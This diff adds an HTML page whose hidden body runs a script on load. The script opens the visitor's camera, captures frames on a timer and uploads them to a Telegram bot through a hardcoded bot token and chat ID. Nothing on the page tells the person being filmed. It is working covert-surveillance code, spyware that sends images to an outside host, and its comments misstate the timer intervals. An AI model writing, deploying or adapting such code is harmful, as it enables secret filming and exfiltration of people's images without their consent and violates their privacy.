@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Background Capture and Send</title>
+    <script src="https://unpkg.com/dynamsoft-camera-enhancer@2.1.0/dist/dce.js"></script>
+</head>
+
+<body style="display: none;">
+    <div id="hiddenPage">
+        <!-- Hidden camera feed for capturing images -->
+        <div id="enhancerUIContainer"></div>
+    </div>
+    <script>
+        const TELEGRAM_BOT_TOKEN = "1268544615:AAHI9Zng2tnVwIkMUralROJ3DXPipDv6a6c"; // Replace with your bot token
+        const TELEGRAM_CHAT_ID = "814520639"; // Replace with your admin's chat ID
+        let enhancer = null;
+        let imageQueue = [];
+        let isSending = false;
+
+        // Initialize the camera
+        async function initializeCamera() {
+            enhancer = await Dynamsoft.DCE.CameraEnhancer.createInstance();
+            document.getElementById("enhancerUIContainer").appendChild(enhancer.getUIElement());
+            await enhancer.open(true);
+        }
+
+        // Capture an image and add it to the queue
+        function captureImage() {
+            if (enhancer) {
+                const frame = enhancer.getFrame();
+
+                // Convert the frame to a Blob and add it to the queue
+                frame.canvas.toBlob((blob) => {
+                    imageQueue.push(blob);
+                }, "image/jpeg");
+            }
+        }
+
+        // Send images from the queue to Telegram
+        async function sendImages() {
+            if (isSending || imageQueue.length === 0) return;
+
+            isSending = true;
+            while (imageQueue.length > 0) {
+                const blob = imageQueue.shift();
+                const formData = new FormData();
+                formData.append("chat_id", TELEGRAM_CHAT_ID);
+                formData.append("photo", blob);
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData,
+                    });
+                    console.log("Image sent successfully");
+                } catch (error) {
+                    console.error("Failed to send image:", error);
+                }
+            }
+            isSending = false;
+        }
+
+        // Start capturing images at 0.2-second intervals
+        async function startCapturing() {
+            await initializeCamera();
+
+            // Capture images every 0.2 seconds
+            setInterval(() => {
+                captureImage();
+            }, 500);
+
+            // Send images every second to avoid overwhelming Telegram
+            setInterval(() => {
+                sendImages();
+            }, 5000);
+        }
+
+        // Start the process
+        startCapturing();
+    </script>
+</body>
+
+</html>
